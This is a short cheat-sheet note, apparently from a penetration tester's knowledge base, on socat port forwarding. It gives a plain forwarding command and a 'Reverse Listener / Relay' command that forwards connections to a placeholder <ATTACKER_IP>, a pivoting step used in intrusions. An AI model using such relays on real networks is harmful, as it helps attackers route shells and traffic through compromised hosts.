---
type: tool
category: networking
tags:
  - tool
---
# Overview


## Forwarding
#### Simple DNAT
```bash
socat -d -d TCP-LISTEN:4444,bind=0.0.0.0,fork,reuseaddr TCP:172.16.1.5:4444
```
^81a449
#### Reverse Listener / Relay (Socat)
```bash
socat TCP-LISTEN:7777,fork TCP:<ATTACKER_IP>:7777
```
## Important Parameter
socat
	`TCP-LISTEN:PORT` = Listens on ALL interfaces for the specified port
	`fork` = creates a new process for every connection, without it socat stops after the first connection is established
 